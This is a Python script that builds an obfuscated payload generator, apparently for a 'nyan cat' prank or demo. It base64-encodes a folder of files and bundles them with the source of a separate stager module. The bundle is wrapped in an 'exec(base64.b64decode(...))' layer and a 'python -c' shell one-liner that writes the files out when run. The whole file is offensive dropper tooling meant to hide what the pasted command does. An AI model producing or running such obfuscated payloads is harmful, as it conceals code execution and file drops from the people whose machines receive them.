import base64
import inspect
import os

import stager


class Payloader:
    def __init__(self, nyan_cat_folder="nyan-cat-code", add_exec_wrapper=True, add_python_bash_wrapper=True,
                 write_to_file=True, payload_file_name="python_nyan_cat_payload.txt"):
        self.nyan_cat_folder = nyan_cat_folder
        self.add_exec_wrapper = add_exec_wrapper
        self.add_python_bash_wrapper = add_python_bash_wrapper
        self.write_to_file = write_to_file
        self.payload_file_name = payload_file_name

        self.function_call_to_append = "write_files({})"
        self.exec_wrapper = "import base64;exec(base64.b64decode('{}'))"
        self.python_bash_wrapper = """python -c "{}" """
        self.source = ""

    def get_file_paths(self):
        files_in_folder = os.listdir(self.nyan_cat_folder)
        file_paths = []
        for file in files_in_folder:
            file_path = os.path.join(self.nyan_cat_folder, file)
            if os.path.isfile(file_path):
                file_paths.append(file_path)
        return file_paths

    def file_to_base64(self, file_path):
        with open(file_path, "rb") as file:
            content = file.read()
        base64_content = base64.b64encode(content)
        return base64_content, os.path.basename(file_path)

    def all_files_to_base64(self):
        file_paths = self.get_file_paths()
        return [self.file_to_base64(file_path) for file_path in file_paths]

    def write_payload_to_file(self):
        if self.write_to_file:
            with open(self.payload_file_name, "w") as file:
                file.write(self.source)

    def do_add_eval_wrapper(self):
        if self.add_exec_wrapper:
            self.source = self.exec_wrapper.format(self.source)

    def do_add_python_bash_wrapper(self):
        if self.add_python_bash_wrapper:
            self.source = self.python_bash_wrapper.format(self.source)

    def stager_source(self):
        files = self.all_files_to_base64()
        _source, *_ = inspect.getsourcelines(stager)
        source = _source.copy()
        formated_function_call = self.function_call_to_append.format(files)
        source.append(formated_function_call)
        source = "".join(source)
        source = source.encode("UTF-8")
        source = base64.b64encode(source)
        self.source = source.decode("UTF-8")

    def make_payload(self):
        self.stager_source()
        self.do_add_eval_wrapper()
        self.do_add_python_bash_wrapper()
        self.write_payload_to_file()


def go():
    payload_only = Payloader(add_python_bash_wrapper=False, add_exec_wrapper=False,
                             payload_file_name="python_nyan_cat_payload_only.txt")
    payload_with_exec = Payloader(add_python_bash_wrapper=False,
                                  payload_file_name="python_nyan_cat_payload_with_exec_wrapper.txt")
    payload_full = Payloader()

    payload_only.make_payload()
    payload_with_exec.make_payload()
    payload_full.make_payload()
